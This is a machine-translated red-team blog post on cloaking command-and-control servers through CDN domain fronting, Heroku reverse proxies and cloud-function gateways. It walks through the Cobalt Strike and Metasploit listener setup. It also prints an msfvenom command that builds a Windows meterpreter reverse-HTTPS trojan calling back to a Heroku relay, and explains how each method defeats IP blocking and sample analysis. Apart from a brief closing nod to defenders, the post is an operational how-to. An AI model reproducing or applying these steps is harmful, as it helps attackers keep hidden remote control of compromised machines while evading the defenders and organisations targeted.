
# Red Team Attack and Defense Infrastructure - C2 IP Cloaking Technology

Author: Wind Up

## Preface

With the start of HW, the blue team brothers have seen a lot of strange operations, this article is mainly from the monitoring of traceability is more common in some of the red team's cloaking techniques to explain. In the actual attack and defense in the effective cloaking of our C2 host is also very necessary, in the work at the same time found that many blue team is not familiar with this, so this article will be in-depth explanation of the three common ways, I hope that through this article can be helpful to you.

## Domain front

Domain front technology is to forward traffic to the real C2 server through the CDN node, in which the CDN node ip by identifying the Host header of the request for traffic forwarding. Here the authors use AliCloud full-site acceleration CDN to achieve arbitrary HOST header modification, using the construction of high-reputation domain names, so as to achieve bypass traffic analysis.

### **First step***

Visit the AliCloud CDN Full Site Acceleration configuration as shown below:

! [img](https://p1.ssl.qhimg.com/t018c8690c7255f74fd.png)

Click Add Domain, fill in the CDN basic information, accelerate the domain name can fill in the high reputation domain name, in the vast majority of domestic service providers, need to verify the ownership of the main domain name, but in the Aliyun full acceleration of CDN as long as the IP is the user's Aliyun host can bypass the verification. You only need to fill in the accelerated domain name and IP to complete the configuration, with CobaltStrike profile can be bypassed to achieve the function of masking the real IP and Header, the function of masking IP.

! [img](https://p2.ssl.qhimg.com/t01dd93273a7c95052a.png)

! [img](https://p5.ssl.qhimg.com/t019ad320c6ccc41640.png)

As shown above, you can fill in the blanks and wait for the CDN to be configured for normal use.

### **Step 2

Use multi-location ping to detect CNAME and get the IP of multi-location CDN.
PING:http://ping.chinaz.com/

! [img](https://p0.ssl.qhimg.com/t017c5a7b77e7f6a693.png)

Here use use three demo effects can be.
  **58.215.145.105
61.168.100.175
42.48.120.160**

### **Step 3**

Using the obtained IP, go to CobaltStrike and configure the profile file.
The profile used here is amazon.profile, you can actually write your own.
  **Download address:https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile**
Modify three places, header “Host” that is.

! [img](https://p5.ssl.qhimg.com/t01e3ecab961edc8f4d.png)

! [img](https://p2.ssl.qhimg.com/t019aef8a130cc6c543.png)

### **Step 4**

Open CobaltStrike with the command.
` . /teamserver xxx.xxx.xxx.xxx password amazon.profile`
Go to CobaltStrike to configure it, the listener configuration is as follows:

! [img](https://p4.ssl.qhimg.com/t016850ae73fc74862b.png)

Configure the HTTPS Hosts to be the CDN IP obtained before, and the HTTP Host(Stager) to be nanci.tencent.com, which is the accelerated domain name we configured, and the port can be 80 by default.
Then turn on the listener to generate the Trojan horse.

  **Found successfully on-line***

! [img](https://p0.ssl.qhimg.com/t012ff50839a9c3544b.png)

And using netstat, we can see that our network connection is the same as the two loaded IPs before.

! [img](https://p5.ssl.qhimg.com/t019a163fab897632b9.png)

As you can see in the image above, the Host of the packet is nanci.tencent.com.

  **So far the domain frontend has been successfully deployed**!

### **Summary

Configuration is simple.
Strong ductility, you can change the IP at any time, in the red and blue confrontation can be quickly deployed, increasing the difficulty of the defense blocking IP.
Host high reputation domain name.
Note that AliCloud does not support https for domain fronts
Disadvantages: larger on CDN resources, not recommended for long time use (except tycoon).

  **In the intelligence made public by MicroStep a few days ago, this kind of attack was mentioned, so the author here dissects the utilization of domain fronting in the hope that it can be helpful to the members of the blue side when monitoring. **

! [img](https://p0.ssl.qhimg.com/t01316d5ba97cf1f256.png)

 

## Heroku proxy cloaking real IP

Heroku is a cloud platform-as-a-service that supports multiple programming languages. It is free to deploy docker containers and open web services to the Internet. Here are the steps. In fact, a simple way to understand the application of C2 cloaking is through the Nginx reverse proxy, from heroku server proxy to our real VPS server.

### Heroku in the CobaltStrike application

**First Steps***  

Register for a heroku account. It is important to note that you need to register with a gmail email address, as QQ and 163 are disabled for domestic email service providers and registration cannot be completed.
Registration URL: https://dashboard.heroku.com/

**Step 2**  

After successful registration, login and visit the following URL to enter the configuration page.
**https://dashboard.heroku.com/new?template=https://github.com/FunnyWolf/nginx-proxy-heroku**

! [img](https://p1.ssl.qhimg.com/t011ab19cc16189d0ed.png)

Here the main need is the arrow pointing to the two places, which App name for the sub-domain prefix name, here we can customize, as long as it has not been registered not repeated.

And TARGET, fill in the domain name of our real VPS server, that is, the domain name of the host that needs to be represented. Here the format is:[https://baidu.com:8443, port 8443 of the proxy VPS.] (https://baidu.com:8443, port 8443 of the proxy VPS. /)

Fill out the form and click Deploy app to deploy automatically.

! [img](https://p4.ssl.qhimg.com/t01368c30adfdf78718.png)

** As shown in the picture above the configuration is successful. **

**Step 3**



Configure two listeners in Cobaltstrike, set PAYLOAD to Beacon HTTPS, HTTPS Hosts to sict.icu which is our real domain name and HTTPS Port to port 8443.

** Listener 1 is shown in the following figure:**

! [img](https://p3.ssl.qhimg.com/t01f4f64a4dccc36103.png)

Continue to configure the second listener, also set the PAYLOAD to Beacon HTTPS, HTTPS Hosts set to nancicdn.herokuapp.com, which is the domain name of heroku that we obtained before.
The App name configured during deployment is a sub-domain prefix, so the domain name of heroku is nancicdn.herokuapp.com, which is the domain name of heroku obtained in the end. HTTPS Port is set to 443.

  ** Listener 2 is shown in the following figure:**

! [img](https://p0.ssl.qhimg.com/t01c642bf6d3b1c20f8.png)

After all the listeners are deployed and the Trojan file is generated, note that the listener that generates the Trojan is set to listener 2, which is the one that points to the heroku domain.

! [img](https://p0.ssl.qhimg.com/t01efd5924bb810e51e.png)

**Cobaltstrike successfully launched.

### Heroku in Metasploit

I won't go into the configuration of the heroku service here, so I'll start directly with the configuration of Metasploit.

**First step** ### Heroku in Metasploit

Open msf
Add a handler to Metasploit, and configure it as shown:

! [img](https://p5.ssl.qhimg.com/t018cb0e768bd66bd21.png)

Use module payload/windows/x64/meterpreter_reverse_https
Set LHOST to the domain we are actually pointing to and LPORT to 8443, as configured in heroku.
Then set the three global parameters as follows:
setg OverrideLHOST nancicdn.herokuapp.com
setg OverrideLPORT 443
setg OverrideRequestHost true

OverrideLHOST is the address of our heroku, the main domain name is fixed, and the subdomain prefix is the app name we just configured in heroku. port is 443 because we configured the https protocol.
After the parameters are configured, enter to_handler to open the listener.

! [img](https://p0.ssl.qhimg.com/t0145ce2a457c0deeb4.png)

As you can see in the image above, listening on port 8443 has been enabled, i.e. the configuration is complete.

**Step 2**

Generate the Trojan horse with the command
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=nancicdn.herokuapp.com LPORT=443 -f exe -o payload.exe
Then transfer the generated mutex to the VM and execute it.

! [img](https://p0.ssl.qhimg.com/t0168b3c0274b952f93.png)

  **Executed and found successfully online at metasploit. **

You can see that the session link address is the heroku relay server address, and the IP of the connection is different for different heroku deployments.

  **The following figure shows this:
Target 1**

! [img](https://p4.ssl.qhimg.com/t019344d0aff6b38cac.png)

Target 2

! [img](https://p2.ssl.qhimg.com/t01baea8271871c8e13.png)

### Summary

The technical principle of heroku hidden C2 is very simple, use heroku service to deploy nginx reverse proxy service, payload connects to nginx of heroku, nginx will forward the traffic to C2.
The advantages are as follows.
Only need to register heroku free account can
No need to register or buy a domain name
comes with a trusted SSL certificate (heroku domain comes with its own certificate)
If the IP address is blocked, you can delete the original heroku app and redeploy heroku app (it takes about 30s), and keep fighting with the defenders.
Simple steps

 

## Cloud Functions

This technology was first proposed in March this year, they use azure to hide the C2, there are corresponding cloud function vendors, so we try to use the cloud function to hide our C2 servers.

### Configuration process

Click on the new cloud function, select the creation mode - custom creation, function name custom or default can be, the operating environment to choose python3.6, of course, there are masters to use other language versions to write but the principle is the same, the region can be arbitrary.

! [img](https://p4.ssl.qhimg.com/t01a7d70fafe09bb90d.png)

Click finish, we first do not edit the cloud function code.

! [img](https://p0.ssl.qhimg.com/t018ef7221d37cdf571.png)

Create the trigger, configured as above, we use the API gateway for the trigger function.

! [img](https://p0.ssl.qhimg.com/t01f7f93590344ada6c.png)

! [img](https://p2.ssl.qhimg.com/t01438523ad79d8c36b.png)

! [img](https://p0.ssl.qhimg.com/t0199a2b1811618fef2.png)

Configure the default path to the API gateway as per the example image above, and then just select Complete and Publish Task Now.

Then we can edit the cloud function and change the content of the C2 variable to your own ip. The following use x-forward-for to confirm the real ip of the target host, if you do not configure it, it will not affect the normal use, but the ip of the online host will be the IP address of the cloud function host.

! [img](https://p3.ssl.qhimg.com/t017c674423b722f964.png)

After the configuration is done here, we get the API gateway address as shown below:

! [img](https://p0.ssl.qhimg.com/t01e5b5f6692e5ca39d.png)

Note the release

! [img](https://p4.ssl.qhimg.com/t015030bd677e793cf9.png)

Then we start to configure the CS client, create a listener, configure the following picture, copy the API gateway address into it, note that the port must be set to 80, if you want to set it to something else you also need to configure the cloud function.

Set the profile file to start, the configuration file http-config set as follows:

! [img](https://p0.ssl.qhimg.com/t01d07317d2814bf8fc.png)

Here is to synchronize with the above cloud function to use X-Forward-For to get the real ip

! [img](https://p0.ssl.qhimg.com/t01d3111d1f988fcf66.png)

Then we generate the Trojan to go live.

! [img](https://p2.ssl.qhimg.com/t01a8ef90e24f56209c.png)

**Successfully online! **

Let's analyze the Trojan, first check the local outreach ip for the Tencent cloud IP address

! [img](https://p4.ssl.qhimg.com/t01758a4d627563aed5.png)

! [img](https://p5.ssl.qhimg.com/t011ddb66db573f8028.png)

found that the Tencent cloud host
Continue to analyze and upload virus samples to MicroStep (this is also the most common analysis method used by Blue Team members).

! [img](https://p1.ssl.qhimg.com/t018ff73af9ff44c278.png)

You can see that only the API gateway domain name can be captured.

### Summary

The good thing about cloud functions is that they are easy to configure, free, efficient, and very suitable for daily penetration use.
Hey, I don't really want to make up the word count at the end of this article.

 

### Postscript

This article is close to the end here, is the HW period, I hope that this article can help the majority of members of the defense side, the face of the red team's stealth technology, in the work of this problem can be the first time to respond to the research and judgment, of course, the above ways are not very good traceability, which is to this day, these methods are still effective reasons, especially in this year's HW, these ways more frequently into our eyes. This year is not just about the large number of 0days. This year is not only a large number of 0day outbreaks, but also some strange trickery, in the test of the enterprise security system capabilities at the same time also in the red and blue honed the strength of the two sides, which is the significance of the red and blue confrontation.